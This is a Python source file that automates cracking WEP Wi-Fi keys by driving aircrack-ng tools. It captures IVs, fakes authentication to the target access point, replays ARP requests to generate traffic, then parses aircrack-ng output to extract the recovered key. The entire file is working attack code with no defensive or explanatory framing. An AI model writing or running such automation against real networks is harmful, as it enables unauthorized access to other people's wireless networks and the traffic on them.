#!/usr/bin/env python3
import time
from subprocess import Popen, PIPE, STDOUT

from tools.aireplay import Aireplay
from tools.airodump import Airodump
from tools.util import remove_colon


class Aircrack:
    def __init__(self):
        self.airodump = Airodump()
        self.aireplay = Aireplay()

    def crack_wep(self, target):
        # Cracking
        crack = Popen(["aircrack-ng", "-q", "-b", target.bssid, target.target_ivs_file + '-01.cap'], stdout=PIPE,
                      stderr=STDOUT)
        return crack

    def auto_crack_wep(self, target):
        capture = self.airodump.capture_iv(target)
        auth = self.aireplay.fake_auth(target)
        arp = self.aireplay.arp_requesting(target)
        time.sleep(10)
        crack = self.crack_wep(target)
        while crack.poll() is None:
            line = crack.stdout.readline().decode()
            print(line)  # Debug
            if "KEY FOUND" in line:
                target.key = remove_colon(line[13:-4])
                capture.kill()
                auth.kill()
                arp.kill()
                crack.kill()
                return 0
            elif "Got no data packets" in line:
                return 3
